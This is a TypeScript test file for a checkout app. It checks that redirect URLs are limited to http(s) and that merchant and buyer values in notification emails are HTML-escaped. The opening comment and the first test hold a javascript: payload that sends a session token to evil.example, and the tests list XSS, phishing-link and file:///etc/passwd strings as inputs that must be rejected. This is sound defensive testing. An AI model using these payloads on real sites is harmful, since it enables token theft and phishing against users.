// Tenant-supplied redirect targets reached the browser unchecked. `new URL()`
// accepts any scheme, so a merchant could set redirectUrl to
// `javascript:fetch('//evil.example/?t='+localStorage.nvd_token)` and a
// third-party buyer clicking "Continue" on the checkout page would execute it in
// the dashboard origin and exfiltrate the session token out of localStorage.
// Separately, the notification email interpolated merchant/provider/buyer values
// into HTML with no escaping, while purchaseEmail.ts already had an escapeHtml.
import test from 'node:test';
import assert from 'node:assert/strict';
import { assertBrowserNavigableUrl, UnsafeOutboundUrlError } from '../utils/safeUrl';
import { normaliseOptionalUrl } from '../routes/products';
import { escapeHtml } from '../utils/purchaseEmail';

test('only http(s) is accepted for a rendered link', () => {
  assert.equal(assertBrowserNavigableUrl('https://example.com/ok').protocol, 'https:');
  assert.equal(assertBrowserNavigableUrl('http://example.com/ok').protocol, 'http:');
  for (const hostile of [
    "javascript:fetch('//evil.example/?t='+localStorage.nvd_token)",
    'javascript:alert(1)',
    'JaVaScRiPt:alert(1)',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'vbscript:msgbox(1)',
    'file:///etc/passwd',
    '  javascript:alert(1)  ',
  ]) {
    assert.throws(() => assertBrowserNavigableUrl(hostile), UnsafeOutboundUrlError,
      `expected ${JSON.stringify(hostile)} to be rejected`);
  }
});

test('product and payment-link URL normalisation refuses script schemes', () => {
  // 'invalid' is the sentinel both routes translate into a 400.
  assert.equal(normaliseOptionalUrl('javascript:alert(1)'), 'invalid');
  assert.equal(normaliseOptionalUrl('data:text/html,<script>alert(1)</script>'), 'invalid');
  assert.equal(normaliseOptionalUrl('https://example.com/pay'), 'https://example.com/pay');
  assert.equal(normaliseOptionalUrl(undefined), null);
  assert.equal(normaliseOptionalUrl(''), null);
});

test('escapeHtml neutralises the characters that break out of HTML', () => {
  assert.equal(
    escapeHtml('<a href="https://evil.example/phish">Verify</a><img src=x>'),
    '&lt;a href=&quot;https://evil.example/phish&quot;&gt;Verify&lt;/a&gt;&lt;img src=x&gt;',
  );
  assert.equal(escapeHtml("it's & fine"), 'it&#39;s &amp; fine');
});

test('the notification email escapes merchant, provider and buyer values', async () => {
  const { buildEmailHtml } = await import('../queues/notificationQueue');
  const benign = { productName: 'Pro plan', buyerName: 'Abebe', reference: 'FT2513001V2G' } as any;
  const hostile = {
    productName: '<a href="https://evil.example/phish">Verify your subscription</a>',
    buyerName: '<img src=x onerror=alert(1)>',
    reference: '"><script>alert(1)</script>',
    webhookUrl: 'https://hooks.example.com/<script>',
  } as any;

  const benignHtml = buildEmailHtml('payment_link.paid', benign);
  const html = buildEmailHtml('payment_link.paid', hostile);

  // The invariant that matters: hostile input must not introduce a single new
  // tag. Counting '<' is exact — escapeHtml turns every attacker '<' into '&lt;',
  // so the tag count must be identical to a benign render. (Substrings like
  // "onerror=" may survive as inert text, which is harmless and expected.)
  const tagsIn = (s: string) => (s.match(/</g) ?? []).length;
  assert.equal(tagsIn(html), tagsIn(benignHtml), 'hostile payload introduced new markup');

  assert.ok(!html.includes('<script'), 'no script tag may survive');
  assert.ok(!html.includes('evil.example/phish">'), 'the injected href must be inert');
  assert.ok(html.includes('&lt;'), 'expected escaped angle brackets');
  // The payload is rendered through JSON.stringify, so its inner quotes are
  // backslash-escaped before HTML escaping; assert the entities, not the exact
  // surrounding punctuation.
  assert.ok(html.includes('&quot;'), 'expected escaped attribute quotes');
  assert.ok(html.includes('&gt;'), 'expected escaped closing brackets');
});
